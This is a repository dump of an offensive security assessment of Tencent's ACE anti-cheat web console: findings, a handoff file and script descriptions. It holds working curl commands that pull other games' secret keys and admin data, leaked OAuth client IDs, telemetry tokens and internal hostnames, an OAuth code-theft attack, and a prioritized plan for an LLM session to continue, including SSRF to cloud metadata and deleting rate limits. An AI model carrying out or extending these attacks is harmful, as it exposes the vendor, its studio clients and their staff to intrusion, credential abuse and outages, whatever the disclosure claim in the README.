@@ -1,0 +1,2450 @@
+Project Path: arc_Leeksov_ace-security-research_xp9u9xq4
+
+Source Tree:
+
+```txt
+arc_Leeksov_ace-security-research_xp9u9xq4
+├── FINDINGS.md
+├── HANDOFF.md
+├── README.md
+├── appendix
+│   ├── blocked_vectors.md
+│   ├── js_analysis.md
+│   └── timeline.md
+├── data
+│   ├── cdn_channels.json
+│   ├── ibox_services.json
+│   └── live_game_ids.json
+├── infrastructure
+│   ├── attack_surface.md
+│   ├── cdn_architecture.md
+│   ├── ibox_services.md
+│   └── oauth_flow.md
+├── scripts
+│   ├── ace_cdn_enum.py
+│   ├── ace_gameid_brute.py
+│   ├── ace_gateway_monitor.py
+│   └── ace_idor_scan.py
+└── vulnerabilities
+    ├── 01_idor_secret_keys.md
+    ├── 02_idor_admin_data.md
+    ├── 03_oauth_code_theft.md
+    ├── 04_no_auth_ibox_gateway.md
+    ├── 05_cos_bucket_leak.md
+    ├── 06_docs_no_auth.md
+    ├── 07_test_env_exposed.md
+    ├── 08_oauth_config_leak.md
+    ├── 09_codebuddy_exposure.md
+    ├── 10_cdn_no_auth.md
+    └── medium
+        └── README.md
+
+```
+
+`FINDINGS.md`:
+
+```md
+# ACE Console — Vulnerability Database
+
+Target: `intl.anticheatexpert.com` (Tencent ACE Anti-Cheat Expert)
+Date: September 1–2, 2026
+
+## CRITICAL
+
+### ACE-001: IDOR — API Secret Keys
+
+| Field | Value |
+|-------|-------|
+| Severity | **CRITICAL** |
+| Endpoint | `POST /cgi/game_info` |
+| Auth required | Yes (any registered account, even unactivated) |
+| Status | **Confirmed** (93 keys dumped) |
+
+**Reproduction:**
+```bash
+curl -sk -X POST https://intl.anticheatexpert.com/cgi/game_info \
+  -H "Content-Type: application/json" \
+  -H "Cookie: ibox_auth_user_token=<token>; ibox_auth_user_id=<email>" \
+  -d '{"game_id":"24011","page_type":"18"}'
+```
+
+**Response:** Returns `secret_key`, `secret_id` for the specified game — regardless of whether the caller owns that game.
+
+**Impact:** `AnoSDKInit()` uses these keys. Attacker can impersonate any game's anti-cheat SDK client. 93 keys dumped from scanning game_ids 24000–24375 + 6095000–6095085. Affected clients include EA, Mihoyo/HoYoverse, Hypergryph (Arknights), Scopely, Ubisoft, Nexon, Netmarble, Cygames, NCsoft, Bilibili, Pocketpair (Palworld), Com2us.
+
+---
+
+### ACE-002: IDOR — Admin Data / Service List
+
+| Field | Value |
+|-------|-------|
+| Severity | **CRITICAL** |
+| Endpoint | `POST /cgi/game_info` |
+| Auth required | Yes (any registered account) |
+| Status | **Confirmed** (450+ games) |
+
+**Reproduction:**
+```bash
+curl -sk -X POST https://intl.anticheatexpert.com/cgi/game_info \
+  -H "Content-Type: application/json" \
+  -H "Cookie: ibox_auth_user_token=<token>; ibox_auth_user_id=<email>" \
+  -d '{"game_id":"24011","page_type":"21"}'
+```
+
+**Response:** Admin email, buyer names (e.g. `v_xheliang`, `v_lmjielong`), full service list with purchase dates and deadlines (some to 2050), all service statuses.
+
+**Impact:** Internal org structure, client relationships, contract details exposed. 254 unique emails, 28 `@tencent.com` internal addresses.
+
+---
+
+### ACE-003: OAuth Code Theft via callback-dev.html
+
+| Field | Value |
+|-------|-------|
+| Severity | **CRITICAL** |
+| Endpoint | `assets.code.tencent.com/common/oauth/callback-dev.html` |
+| Auth required | No |
+| Status | **Confirmed** (code analysis), exploitation requires Tencent internal network |
+
+**Vulnerability:** Dev OAuth callback does `window.opener.postMessage({code}, '*')` — sends OAuth authorization code to ANY opener origin. Production callback validates `state` against `allowed-origin.json` allowlist; dev version skips all validation.
+
+**Leaked credentials:**
+- Prod client_id: `d15f1aada3db4be2be622afed0019a29`
+- Test client_id: `3c457707400c4e6c98f019536c9ad2d7`
+- Server: `git.woa.com` (Tencent internal GitLab)
+
+**Attack scenario:** Attacker hosts a page that opens popup to `git.woa.com/oauth/authorize?client_id=d15f1aada3db4be2be622afed0019a29&redirect_uri=https://assets.code.tencent.com/common/oauth/callback-dev.html`. If a Tencent employee on internal network visits → popup redirects to callback-dev → postMessage sends OAuth code to attacker → full Gongfeng git account takeover.
+
+**Limitation:** Requires victim on Tencent internal network (git.woa.com unreachable externally).
+
+---
+
+## HIGH
+
+### ACE-004: 21 ibox Services Without Auth on CGI
+
+| Field | Value |
+|-------|-------|
+| Severity | **HIGH** |
+| Endpoint | `POST /ibox_{ID}/cgi/` (21 services) |
+| Auth required | **No** |
+| Status | **Blocked** (gateway crash, nginx/1.27.0 → all 500) |
+
+Backend processes requests without auth checks (returns 500 from parsing failure, not 401 from auth). Same bug class as the original `puv_record` no-auth bug.
+
+**Services:** 1973, 2009, 2011, 2051, 2094, 2140, 2145, 2151, 2217, 2218, 2262, 2309, 2358, 2378, 2412, 2530, 2555, 2574, 2593, 2643, 2647, 2732, 2796, 2913
+
+**Key targets when gateway recovers:**
+- `ibox_2913/cgi/base/staff_info` — staff names
+- `ibox_2913/cgi/feature_deployment` — CDN deploy configs
+- `ibox_2913/cgi/feature_force_deploy` — push rules to ALL games
+- `ibox_2094/cgi/ace_sdk/download/default` — SDK download
+- `ibox_2136/cgi/auth/api/rate_limit/rule/query` — rate limit rules
+
+---
+
+### ACE-005: COS Bucket Name Leaked
+
+| Field | Value |
+|-------|-------|
+| Severity | **HIGH** |
+| Endpoint | ibox_2009 JS bundle |
+| Status | **Confirmed** (geo-restricted to China) |
+
+Bucket: `iegss-ugc-accessvr-1258344700.cos.ap-guangzhou.myqcloud.com`
+Contains: `system_download/ace_auth_demo.zip`, UGC HTTP integration package.
+Also found: WAF config bucket `domain-config-1256704386`, SDK path appid `1786004140`.
+
+---
+
+### ACE-006: Documentation Without Auth
+
+| Field | Value |
+|-------|-------|
+| Severity | **HIGH** |
+| Status | **Confirmed** |
+
+```bash
+curl -sk https://intl.anticheatexpert.com/docs/ACE-files/ugc_access/ace_scene_register_guide.pdf -o guide.pdf  # 1.14MB
+curl -sk https://intl.anticheatexpert.com/docs/ACE-files/ugc_access/content_api_test.xlsx -o test.xlsx          # 12KB
+```
+
+7 additional doc-center pages accessible via `/doc-center/{sha1_hash}` (Vue SSR, 17KB each).
+
+---
+
+### ACE-007: Test Environment Exposed
+
+| Field | Value |
+|-------|-------|
+| Severity | **HIGH** |
+| Host | `test.intl.anticheatexpert.com` |
+| Status | **Confirmed** |
+
+`/cgi/doc` processes requests without auth (returns 400 "para unlegal", not 401). `puv_record` already fixed on test (401). Build: `cloud_100260_test/2608201250`.
+
+---
+
+### ACE-008: OAuth Config & Internal Domains Leaked
+
+| Field | Value |
+|-------|-------|
+| Severity | **HIGH** |
+| Source | JS bundles + `allowed-origin.json` |
+| Status | **Confirmed** |
+
+QQ appId `101531192`, Gongfeng client_id `d15f1aada3db4be2be622afed0019a29`. 10 internal Tencent domains in OAuth allowlist: `lego2b.woa.com`, `devops.woa.com`, `zhiyan.woa.com`, `codecraft.weixin.woa.com`, etc.
+
+---
+
+### ACE-009: CodeBuddy AI Copilot (Internal) Exposed
+
+| Field | Value |
+|-------|-------|
+| Severity | **HIGH** |
+| URL | `assets.aicode.tencent.com/gongfeng-copilot-monaco/latest/index.js` |
+| Status | **Confirmed** (3.5MB JS, v2.16.1) |
+
+Telemetry: `attaid=00400014144`, `token=6478159937` (verified live on `h.trace.qq.com` — 200). 12 internal `*.woa.com` domains. CI/CD BK-CI config in `external-context.json`.
+
+---
+
+### ACE-010: CDN Files Without Auth
+
+| Field | Value |
+|-------|-------|
+| Severity | **HIGH** |
+| Host | `dl.listdl.com` |
+| Status | **Confirmed** (456 files) |
+
+URL pattern: `https://dl.listdl.com/iedsafe/Client/{platform}/{channel}/{hash_A}/{filename}`
+
+456 unique files across iOS/Android/Windows. Anti-cheat rules, VM images, configs. No token, no rate limit. 36 iOS channels, 7 Windows channels.
+
+---
+
+## MEDIUM
+
+| ID | Title | Endpoint | Status |
+|----|-------|----------|--------|
+| ACE-011 | No-auth game_id enumeration | `POST /ibox_2592/cgi/puv_record` | Confirmed (484 IDs), now 500 |
+| ACE-012 | Host header validation missing | Any path with wrong Host | Confirmed (cache poisoning vector) |
+| ACE-013 | Rate limit CRUD endpoints | `ibox_2136/cgi/auth/api/rate_limit/rule/*` | Blocked (gateway 500) |
+| ACE-014 | SSRF endpoint | `ibox_{2084,2279,2913}/cgi/api/lower_code_interface_call` | Blocked (gateway 500) |
+| ACE-015 | Stale auth service | `login.auth.sgp.anticheatexpert.com` | Confirmed (Jul 2025 build, nginx/1.10.3) |
+| ACE-016 | Expired TLS cert | `*.oa.com` (app.ibox.oa.com) | Confirmed (expired Aug 17, 2026) |
+| ACE-017 | Missing security headers | Main site | Confirmed (no HSTS, CSP, X-Frame-Options) |
+| ACE-018 | API docs behind auth | `/api-docs` | Confirmed (401 not 404) |
+| ACE-019 | WebSocket endpoints | `/api/ws`, `/cgi/ws` | Confirmed (401, exist but gated) |
+
+```
+
+`HANDOFF.md`:
+
+```md
+# ACE Anti-Cheat Console Security Research — Continuation Handoff
+
+> Paste this entire document into a fresh LLM session to continue the research. No external context needed.
+
+## Target
+
+**intl.anticheatexpert.com** — Tencent ACE (Anti-Cheat Expert) web console. This is the management portal where game developers configure anti-cheat rules, download SDKs, manage detection features, and monitor cheat activity for their games. Powered by the ibox microservice framework.
+
+**Scope:** `*.anticheatexpert.com`, `*.listdl.com`, related CDN/auth/asset infrastructure.
+
+**Account:** We have a registered account (email login) that is **NOT activated** — no game service bound. Sufficient for IDOR (reading other games' data) but blocked from SDK download (`error: -102, "no active game service"`).
+
+**Date:** Research started Sep 1, 2026. Last active Sep 2, 2026.
+
+---
+
+## What Was Found (19 vulnerabilities)
+
+### CRITICAL
+
+**1. IDOR: API Secret Keys (page_type=18)**
+```bash
+curl -sk -X POST https://intl.anticheatexpert.com/cgi/game_info \
+  -H "Content-Type: application/json" \
+  -H "Cookie: $ACE_COOKIES" \
+  -d '{"game_id":"24011","page_type":"18"}'
+```
+Returns `secret_key` + `secret_id` for ANY game. 93 keys dumped across 450+ games. Impact: impersonate any game's AnoSDK — call `AnoSDKInit(game_id, secret_key)` to authenticate as that game's anti-cheat instance. Clients include EA, Mihoyo/HoYoverse, Hypergryph (Arknights), Lilith, Scopely, Ubisoft, Nexon, Netmarble, Cygames, NCsoft, Bilibili, Com2us, Pocketpair (Palworld), Garena.
+
+**2. IDOR: Admin Data (page_type=21)**
+Same endpoint, `page_type=21` → admin email, buyer names (Tencent internal accounts like `v_xheliang`, `v_lmjielong`), full service list with purchase dates and deadlines (some to 2050), service status flags. 450+ games, 254 unique emails, 28 `@tencent.com` internal addresses.
+
+**3. OAuth Code Theft via callback-dev.html**
+```
+https://assets.code.tencent.com/common/oauth/callback-dev.html
+```
+This file does `window.opener.postMessage({code}, '*')` — sends OAuth authorization code to **ANY opener origin**. No CSP, no X-Frame-Options, `Access-Control-Allow-Origin: *`.
+
+Production callback (`callback.html`) validates the `state` param against an allowlist (`allowed-origin.json`). The dev version skips all validation.
+
+- Prod OAuth client_id: `d15f1aada3db4be2be622afed0019a29`
+- Test OAuth client_id: `3c457707400c4e6c98f019536c9ad2d7`
+- OAuth server: `git.woa.com` (Tencent internal Gongfeng/GitLab)
+
+**Attack:** Attacker page opens popup → `git.woa.com/oauth/authorize?client_id=d15f...&redirect_uri=https://assets.code.tencent.com/common/oauth/callback-dev.html` → if a Tencent employee on internal network visits the page while logged into git.woa.com → popup redirects to callback-dev.html → `postMessage` sends OAuth code to attacker → full Gongfeng git account takeover.
+
+**Limitation:** Victim must be on Tencent internal network (git.woa.com is internal).
+
+### HIGH
+
+**4. 21 ibox Services Without Auth on CGI**
+POST to `/ibox_{ID}/cgi/` returns **500** (not 401) — meaning the request passes nginx to the backend without auth, and the backend crashes on bad input. Same bug class that allowed `puv_record` to work without auth. **CURRENTLY BLOCKED** — the entire ibox gateway (nginx/1.27.0) is returning 500. When it recovers, all 21 services become testable.
+
+No-auth services: 1973, 2009, 2011, 2051, 2094, 2136, 2140, 2145, 2151, 2217, 2218, 2262, 2309, 2358, 2378, 2412, 2530, 2555, 2574, 2593, 2643, 2647, 2732, 2796, 2913.
+
+Auth-gated (401): 2110, 2139, 2465, 2491, 2592, 2593, 2831.
+
+**5. COS Bucket Name Leaked in JS**
+`iegss-ugc-accessvr-1258344700.cos.ap-guangzhou.myqcloud.com` — contains `system_download/ace_auth_demo.zip` and UGC HTTP integration package. Geo-restricted to mainland China.
+
+**6. Documentation Accessible Without Auth**
+- `https://intl.anticheatexpert.com/docs/ACE-files/ugc_access/ace_scene_register_guide.pdf` (1.14MB, 200)
+- `https://intl.anticheatexpert.com/docs/ACE-files/ugc_access/content_api_test.xlsx` (12KB, 200)
+- 7 `/doc-center/{sha1_hash}` pages (Vue SSR, 17KB each, 200)
+
+**7. Test Environment Exposed**
+`test.intl.anticheatexpert.com` — live test environment. `/cgi/doc` processes requests without auth (returns 400 "para unlegal", not 401). Same istio-envoy stack. ibox services present but gateway also down (500).
+
+**8. OAuth Config + Allowed Origins Leaked**
+- QQ OAuth appId: `101531192`, callback: `mtp.qq.com/ibox_1914/cgi/qqcallback`
+- `allowed-origin.json` publicly readable — 10 internal Tencent domains: `lego2b.woa.com`, `devops.woa.com`, `zhiyan.woa.com`, `expt.woa.com`, `hlego.woa.com`, `codecraft.weixin.woa.com`, `lite-playground.weixin.woa.com`, `gongfeng-copilot-monaco.pages.woa.com`, `cms.video.cloud.cctv.com` (CCTV!)
+
+**9. CodeBuddy AI Copilot Internal Edition Exposed**
+Public 3.5MB JS at `assets.aicode.tencent.com/gongfeng-copilot-monaco/latest/index.js` (v2.16.1). Contains:
+- Telemetry: `attaid=00400014144`, `token=6478159937` (verified live on `h.trace.qq.com`)
+- 12 internal `*.woa.com` domains: `copilot.code.woa.com`, `copilotflow.woa.com`, `git.woa.com`, `test-copilot.code.woa.com`, `ut-service-ty.tapd.woa.com`, `km.woa.com`, `iwiki.woa.com`, etc.
+
+**10. CDN Files Without Auth**
+456 unique payload files across 3 platforms (iOS/Android/Windows), 36 channels, ~296 game instances. All downloadable by direct URL:
+```
+https://dl.listdl.com/iedsafe/Client/{platform}/{channel}/{CRC32_hash}/{filename}
+```
+File types: `mrpcs*.data`, `ob_*.zip`, `comm.*`, `tssmua.zip`, `pubgm_script_id_28.gs1.cdc` (Python bytecode!).
+
+### MEDIUM
+
+**11. No-Auth Game ID Enumeration**
+`POST /ibox_2592/cgi/puv_record` with `game_id=X` — no cookies needed. `code=0` = exists, `code=-1` = not. 484 live IDs found. **Currently 500** (gateway down).
+
+**12. Host Header Validation Missing**
+Any non-matching `Host:` header → HTTP 200 empty response. Istio-envoy default vhost misconfiguration. Cache poisoning vector.
+
+**13. Rate Limit CRUD Endpoints (ibox_2136)**
+`/cgi/auth/api/rate_limit/rule/{create,delete,query,update}` — if accessible, could disable rate limiting for all services. Currently 500 (gateway).
+
+**14. SSRF Endpoint on 3 Services**
+`lower_code_interface_call` on ibox_2084, 2279, 2913 accepts `{url, method, header, para}` — full HTTP proxy. Currently 500 (gateway down + 2084/2279 decommissioned). ibox_2913 is the live candidate.
+
+**15. Stale Auth Service**
+`login.auth.sgp.anticheatexpert.com` — build from Jul 15, 2025 (`100047_oper/2507151708`). nginx/1.18.0 Ubuntu. `__env: "{{ENV}}"` template not rendered (not SSTI — static config, not user-controllable). Internal domain leaked: `login.auth.ace.woa.com` (HTTP!).
+
+**16. Expired TLS Certificate**
+`*.oa.com` — expired Aug 17, 2026. GoDaddy cert. `app.ibox.oa.com` and `appgz.ibox.oa.com` resolve to 141.144.196.217 (empty nginx proxy).
+
+**17. Missing Security Headers**
+No HSTS, CSP, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy on main site.
+
+**18. Swagger/API Docs Behind Auth**
+`/api-docs` returns 401 (not 404) — API documentation exists, potentially accessible with any auth session.
+
+**19. WebSocket Endpoints**
+`/api/ws`, `/cgi/ws` return 401 — real-time endpoints exist behind auth.
+
+---
+
+## Current Blocker
+
+**The entire ibox gateway (nginx/1.27.0) is returning 500 on all CGI endpoints.** This is an infrastructure-level outage affecting ALL 31+ microservices. It went down between Sep 1 and Sep 2, possibly triggered by our scan traffic (we hit ~500 game IDs rapidly).
+
+When it recovers, the highest-value targets are:
+
+| Priority | Endpoint | Expected Impact |
+|----------|----------|----------------|
+| 1 | `ibox_2913/cgi/feature_force_deploy` | Push anti-cheat rules to ALL games |
+| 2 | `ibox_2094/cgi/ace_sdk/download/default` | Download SDK without game binding |
+| 3 | `ibox_2913/cgi/base/staff_info` | Leak Tencent staff names |
+| 4 | `ibox_2136/cgi/auth/api/rate_limit/rule/delete` | Disable rate limiting |
+| 5 | `ibox_2913/cgi/api/lower_code_interface_call` | SSRF → cloud metadata |
+| 6 | `ibox_2094/cgi/api/page/get?env=1&app_id=1&page_name=sdk_download` | SDK page data |
+
+Run `scripts/ace_gateway_monitor.py` to watch for recovery.
+
+---
+
+## Attack Surface Map
+
+### Hosts
+
+| Host | IP | Server | Role | Status |
+|------|----|--------|------|--------|
+| `intl.anticheatexpert.com` | 101.32.104.181 | istio-envoy | Main console | Live (frontend 200, CGI 500) |
+| `test.intl.anticheatexpert.com` | — | istio-envoy | Test env | Live (same issues) |
+| `m.intl.anticheatexpert.com` | — | nginx/1.10.3 | Mobile | Known |
+| `login.auth.sgp.anticheatexpert.com` | — | nginx/1.18.0 Ubuntu | Auth service | Stale build (Jul 2025) |
+| `down.anticheatexpert.com` | — | Qnginx/1.3.2 | COS-backed CDN | Live |
+| `dl.listdl.com` | — | custom | Primary CDN | Live |
+| `app.ibox.oa.com` | 141.144.196.217 | nginx | Legacy proxy | Empty (expired cert) |
+| `appgz.ibox.oa.com` | 141.144.196.217 | nginx | Legacy proxy | Empty (expired cert) |
+| `knot.woa.com` | — | iOA VPN gate | Feature flags | 403 (zero-trust) |
+| `assets.code.tencent.com` | — | CDN | Gongfeng OAuth/assets | Public |
+| `assets.aicode.tencent.com` | — | COS CDN | CodeBuddy JS | Public |
+
+### 31 ibox Microservices
+
+| ibox | Title | Purpose | Key Routes | CGI Auth |
+|------|-------|---------|------------|----------|
+| 1973 | UGC反馈系统 | UGC Feedback | — | No |
+| 2009 | UGC接入系统 | UGC Access System | `/punish-standard`, `/config-manager`, `/blackbox-test` | No |
+| 2011 | — | Unknown | — | No (403 frontend) |
+| 2051 | — | Unknown | — | No (403 frontend) |
+| 2094 | 端游安全 | **PC Game Security** | **`/sdk-download`**, `/realtime-data`, `/usercheat-query`, `/sample-check`, `/cheat-monitor` | No |
+| 2110 | — | Unknown | — | Yes (401) |
+| 2136 | 权限系统 | **Permission System** | `rate_limit/rule/CRUD`, `_set_cookie`, `auth_group`, `service_info` | No |
+| 2139 | — | Unknown (PUBG channel ID?) | — | Yes (401) |
+| 2140 | 手游安全 | Mobile Game Security | standard console | No |
+| 2145 | UGC运营系统 | UGC Operations | — | No |
+| 2151 | — | Unknown | — | No |
+| 2217 | — | Unknown | — | No |
+| 2218 | — | Unknown | — | No (403 frontend) |
+| 2262 | Replay运营平台 | **Replay Ops Platform** | `/webIDE`, `/cos-file-manage`, `/model-training`, 66 REST APIs, Monaco+AI | No |
+| 2309 | Anti-Cheat | Anti-Cheat Console | — | No |
+| 2357 | — | Replay CGI Backend | `/replay/cgi/api/v1/*` | — |
+| 2358 | UGC运营系统 | UGC Operations | — | No |
+| 2378 | UGC运营系统 | UGC Operations | — | No |
+| 2412 | — | Unknown | — | No |
+| 2465 | — | Unknown | — | Yes (401, 403 frontend) |
+| 2491 | — | Unknown | — | Yes (401) |
+| 2530 | UGC反馈系统 | UGC Feedback | — | No |
+| 2555 | 数据中心 | **Data Center** | `/monitor`, `/penalty-statistics`, `/report-config`, `/simulator` | No |
+| 2574 | — | Unknown | — | No |
+| 2592 | — | PUV Tracker | `puv_record` (was no-auth) | Yes (401) |
+| 2593 | — | PUV Tracker sibling | — | No (decommissioned frontend) |
+| 2643 | — | Unknown | — | No (403 frontend) |
+| 2647 | 手游安全 | Mobile Game Security | `/sample-cloud-detect`, `/cheat-purchase`, `/device-mgr` | No |
+| 2732 | 数据中心 | Data Center (clone) | same as 2555 | No |
+| 2774 | — | Unknown | — | 502 (bad gateway) |
+| 2796 | 手游安全 | Mobile Game Security | — | No |
+| 2831 | — | Unknown | — | Yes (401) |
+| 2908 | — | Unknown | — | 500 |
+| 2913 | 特征运营系统 | **CDN Feature Publishing** | **`/cdn-pub`**, `/feature-pub-history`, `/idip-pub`, `/svrsdk-pub`, `feature_deployment`, **`feature_force_deploy`** | No |
+| 3311 | — | Audit/Report | `/audit/report` | — |
+
+### CDN Architecture
+
+Three platforms, all without auth:
+- **iOS**: `dl.listdl.com/iedsafe/Client/ios/{channel}/config2.xml` → XML with `<game hash_A="..." hash_B="...">` → `dl.listdl.com/iedsafe/Client/ios/{channel}/{hash_A}/{filename}`
+- **Android**: same base, 98 game hashes on channel 2139 (vs 44 on iOS)
+- **Windows**: 7 channels — `ob_x_ver_86.zip` (x86 OBJVM), `ob_cs2_86.zip`, `comm.zip`
+
+36 known channels:
+
+| Channel | Game |
+|---------|------|
+| 2139 | PUBG Mobile (Global) |
+| 2131 | PUBG Mobile (Chinese) |
+| 2202 | PUBG Mobile (Vietnam) |
+| 6139 | PUBG Mobile (Korea/Japan) |
+| 2244 | PUBG Mobile (Taiwan) |
+| 2257 | Call of Duty Mobile (Global) |
+| 2152 | Call of Duty Mobile (Chinese) |
+| 2292 | Call of Duty Mobile (Garena) |
+| 2297 | Call of Duty Mobile (Korea) |
+| 2352 | Call of Duty Mobile (Vietnam) |
+| 2487 | Arena Breakout (Global) |
+| 2577 | Honor of Kings (Chinese) |
+| 8888 | ACE Test ID |
+| 2915 | Delta Force Mobile |
+| 20714 | Arena Breakout (newer channel) |
+| 10039 | Delta Force (Garena) |
+| 29001 | Free Fire |
+
+(Full 36-channel list in `data/cdn_channels.json`)
+
+---
+
+## What Didn't Work
+
+- **SQLi**: Tencent Cloud WAF blocks all injection patterns. Single quote returns "params invalid" (backend filters). WAF triggers on `OR`, `UNION`, encoded variants.
+- **SSRF via lowcode**: `ibox_2084/2279` decommissioned (404). `ibox_2913` has the endpoint but gateway is down.
+- **OAuth open redirect**: QQ OAuth strictly validates `redirect_uri` against registered callback. Fragment injection, subdomain bypass, path traversal all rejected.
+- **Source maps**: No `.js.map` files deployed. No `X-SourceMap` headers. Both marketing and console JS are stripped.
+- **COS bucket listing**: Qnginx proxy strips `?list-type=2`, `?acl`, `?cors`, `?versioning` params.
+- **COS bucket access (China-only)**: `iegss-ugc-accessvr-1258344700.cos.ap-guangzhou.myqcloud.com` — geo-blocked outside mainland China.
+- **Path traversal on CDN**: `../` normalized by CDN layer, encoded variants fail, no directory listing.
+- **SDK download**: All download endpoints require active game service (`-102`). COS proxy `/cos/` broken (nginx/1.10.3 upstream timeout).
+- **Internal domains** (`*.woa.com`): `copilot.code.woa.com`, `git.woa.com`, etc. — timeout, truly internal. Exception: `knot.woa.com` resolves but behind iOA zero-trust VPN (403).
+- **CCTV CMS** (`cms.video.cloud.cctv.com`): NXDOMAIN — purely internal.
+- **Telemetry readback**: `h.trace.qq.com` is write-only fire-and-forget. Cannot read telemetry data. `rumt-sg.com` rejects non-SDK requests.
+- **Host header bypass**: Returns empty 200 (default vhost), request never reaches backend.
+- **Verb tampering**: Consistent 401 enforcement regardless of HTTP method.
+- **Header injection**: `X-Forwarded-For`, `X-Real-IP`, `X-Original-URL` — no effect.
+- **SSTI on login.auth.sgp**: `{{ENV}}` is in static server-rendered config, not user-controllable input.
+- **Brute-force login**: CAPTCHA-protected (Tencent Turing CAPTCHA).
+
+---
+
+## Authentication
+
+Cookie format (set after login):
+```
+ibox_auth_user_token=<500-char hex token>     # cryptographically bound to user_id
+ibox_auth_user_id=<email URL-encoded>
+ibox_auth_user_name=<email URL-encoded>
+ibox_auth_source=AccountLogin
+D_CK=<13-digit timestamp>
+af8e8a5b95037d16=<URL-encoded session blob>
+TDC_itoken=<uid>:<timestamp>
+ace_lang=en
+source=AccountLogin
+user_id=<email URL-encoded>
+user_name=<email URL-encoded>
+```
+
+The `ibox_auth_user_token` is the actual auth credential. It's cryptographically tied to the `user_id` — swapping one without the other fails.
+
+---
+
+## Tools Available
+
+| Script | Purpose | Auth Needed |
+|--------|---------|-------------|
+| `scripts/ace_gateway_monitor.py` | Polls ibox gateway every 60s, alerts on recovery | No |
+| `scripts/ace_idor_scan.py` | Scans game_id ranges, extracts secret_keys/admin data | Yes (`ACE_COOKIES` env) |
+| `scripts/ace_gameid_brute.py` | Async brute-force game_id via puv_record (no auth) | No |
+| `scripts/ace_cdn_enum.py` | Enumerates CDN channels, downloads config manifests | No |
+
+---
+
+## Priority Next Steps
+
+1. **MONITOR GATEWAY** — run `python3 -u scripts/ace_gateway_monitor.py`. When ibox nginx recovers, immediately proceed to steps 2-6.
+
+2. **SDK Download (no auth)** — `POST /ibox_2094/cgi/ace_sdk/download/default` with empty JSON `{}`. Also try `ace_sdk/download/update_sdk`. If either returns data, we have the SDK.
+
+3. **CDN Rule Push** — `POST /ibox_2913/cgi/feature_force_deploy` with `{}`. If this works without auth, it means pushing anti-cheat rules to all games globally. **CRITICAL — do NOT actually push; just confirm the endpoint responds.**
+
+4. **Staff Info Leak** — `POST /ibox_2913/cgi/base/staff_info` with `{}`.
+
+5. **Rate Limit Disable** — `POST /ibox_2136/cgi/auth/api/rate_limit/rule/query` with `{}`. If readable, also test `create`/`delete`.
+
+6. **SSRF** — `POST /ibox_2913/cgi/api/lower_code_interface_call` with `{"url":"http://169.254.169.254/latest/meta-data/","method":"GET","header":{},"para":{}}`. Cloud metadata SSRF.
+
+7. **COS Bucket (China IP)** — if you have a China-based machine/proxy, try `curl https://iegss-ugc-accessvr-1258344700.cos.ap-guangzhou.myqcloud.com/system_download/ace_auth_demo.zip`.
+
+8. **New JS Analysis** — console build updated Sep 1 (`2609011453`). Fetch all chunks from `https://intl.anticheatexpert.com/cloud_100135_oper/2609011453/js/` and grep for new endpoints, secrets, download paths.
+
+9. **Activated Account** — try creating a game in the console (any name, `com.test.something`, FPS type). Even if status is "Reviewing", test whether SDK download unlocks.
+
+10. **Replay Platform REST APIs** — 66 endpoints under `/api/v1/` on ibox_2262. All return 401 currently. Test with auth cookies — these bypass ibox gateway (direct REST, not CGI).
+
+---
+
+## Key Technical Notes
+
+- The ibox gateway (`nginx/1.27.0`) is a reverse proxy layer in front of all microservices. It's separate from the istio-envoy layer that handles the main site. When the gateway is up, CGI requests that return 500 (not 401) are reaching the backend without auth checks.
+- Console uses two frontend codebases: marketing (`cloud_100260_oper`, Nuxt SSR) and console (`cloud_100135_oper`, Vue 2 SPA with ibox framework).
+- `ibox_1914` (OAuth callback), `ibox_2084` and `ibox_2279` (lowcode proxy) were decommissioned between Sep 1-2.
+- The `puv_record` no-auth endpoint was either patched or broken between sessions.
+- WAF is Tencent Cloud WAF with feedback to `api.waf-intl.qq.com`.
+- All COS buckets found are in `ap-guangzhou` region and geo-restricted.
+
+```
+
+`README.md`:
+
+```md
+# ACE Security Research
+
+Security assessment of `intl.anticheatexpert.com` — Tencent ACE (Anti-Cheat Expert) web console.
+
+> This research was conducted under authorized responsible disclosure. See `security.txt` and `security-policy.html` on the target domain.
+
+## Summary
+
+| Severity | Count | Key Findings |
+|----------|-------|-------------|
+| **Critical** | 3 | IDOR secret keys (93 games), IDOR admin data (450 games), OAuth code theft |
+| **High** | 7 | 21 no-auth services, COS bucket leak, docs exposure, test env, CDN no-auth |
+| **Medium** | 9 | Game ID enum, SSRF endpoint, rate limit CRUD, missing headers, stale services |
+
+## Structure
+
+```
+HANDOFF.md              <- START HERE for continuing research in a new LLM session
+FINDINGS.md             <- All vulnerabilities with reproduction steps
+infrastructure/         <- Attack surface maps, service tables, CDN architecture
+vulnerabilities/        <- Per-vulnerability detail files
+scripts/                <- Scanning and monitoring tools
+data/                   <- Machine-readable findings (services, channels, game IDs)
+appendix/               <- JS analysis, blocked vectors, timeline
+```
+
+## Quick Start
+
+```bash
+# Monitor ibox gateway for recovery (main blocker)
+python3 -u scripts/ace_gateway_monitor.py
+
+# Enumerate CDN channels
+python3 scripts/ace_cdn_enum.py --platform ios -o cdn_ios.json
+
+# Brute-force game IDs (no auth needed)
+python3 scripts/ace_gameid_brute.py live_ids.json
+
+# IDOR scan (needs cookies)
+ACE_COOKIES="ibox_auth_user_token=...; ibox_auth_user_id=..." \
+  python3 scripts/ace_idor_scan.py -o results.json
+```
+
+## Continuing Research
+
+Paste the contents of `HANDOFF.md` into a new Claude/GPT session. It contains the complete attack surface, all findings, blocked vectors, and prioritized next steps.
+
+## Current Blocker
+
+The ibox microservice gateway (nginx/1.27.0) is returning 500 on all CGI endpoints. 21 services without auth enforcement cannot be tested until it recovers. Run the gateway monitor to be notified when it comes back.
+
+## Timeline
+
+- **Sep 1, 2026** — Initial reconnaissance, IDOR discovery, game ID brute-force, CDN enumeration
+- **Sep 2, 2026** — ibox service mapping (31 found), test env discovery, OAuth callback analysis, CodeBuddy exposure, gateway down
+
+```
+
+`appendix/blocked_vectors.md`:
+
+```md
+# Blocked Attack Vectors
+
+Vectors tested and confirmed non-exploitable. Documented to avoid re-testing.
+
+## Web Application
+
+| Vector | Result | Detail |
+|--------|--------|--------|
+| **SQL Injection** | Blocked | Tencent Cloud WAF blocks `OR`, `UNION`, encoded variants. Single quote → `"params invalid"` (backend filters at application level). WAF feedback UUID from `api.waf-intl.qq.com`. Same WAF on both prod and test. |
+| **SSTI** | Not vulnerable | `{{ENV}}` on login.auth.sgp is a static server-rendered config block, not user-controllable. `{{7*7}}` in params/headers/path has no effect. |
